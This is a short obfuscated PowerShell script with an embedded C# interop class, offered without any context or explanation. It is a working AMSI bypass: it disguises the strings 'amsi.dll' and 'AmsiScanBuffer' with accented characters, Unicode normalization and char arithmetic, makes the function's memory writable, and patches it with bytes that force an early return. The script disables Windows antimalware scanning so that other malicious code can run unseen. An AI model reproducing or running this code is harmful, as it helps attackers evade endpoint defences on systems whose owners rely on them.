$hfTvom = @"
using System;
using System.Runtime.InteropServices;
public class hfTvom {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr HTKvjjFSisBq, string po0nJ_tEUjVsDd74AW);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr MlDeehHMbOYV42cs, UIntPtr HJhgVRM, uint FL4VSB7rz2b2Jz, out uint oFaVe);
}
"@

Add-Type $hfTvom

$MaNu7 = [hfTvom]::LoadLibrary("$(('âm'+'sì'+'.d'+'ll').norMAlIZE([char](27+43)+[chAr](25+86)+[cHAr](56+58)+[chaR](109*44/44)+[ChAr](40+28)) -replace [CHaR](86+6)+[chaR](76+36)+[Char](123+108-108)+[ChAr]([BYtE]0x4d)+[ChAr](110*92/92)+[chaR]([BYTe]0x7d))")
$vlaF4lBYYDyy61T = [hfTvom]::GetProcAddress($MaNu7, "$(('ÂmsìSc'+'ânBúff'+'èr').noRmalIze([CHaR]([BytE]0x46)+[ChAR](111+66-66)+[ChAR](114)+[chAr]([BYTE]0x6d)+[CHaR](68+52-52)) -replace [Char]([bYTE]0x5c)+[CHAr]([bYtE]0x70)+[cHaR](94+29)+[ChAr](40+37)+[char]([bYtE]0x6e)+[Char]([ByTE]0x7d))")
$p = 0
[hfTvom]::VirtualProtect($vlaF4lBYYDyy61T, [uint32]5, 0x40, [ref]$p)
$pBiQo8hXn = "0xB8"
$Ij7rh = "0x57"
$OY4KR2ig6fi90pg_xNe = "0x00"
$INTnQV7 = "0x07"
$dumCh1_GmBh3Vh10 = "0x80"
$myQli1 = "0xC3"
$eMmlTK2aV4y = [Byte[]] ($pBiQo8hXn,$Ij7rh,$OY4KR2ig6fi90pg_xNe,$INTnQV7,+$dumCh1_GmBh3Vh10,+$myQli1)
[System.Runtime.InteropServices.Marshal]::Copy($eMmlTK2aV4y, 0, $vlaF4lBYYDyy61T, 6)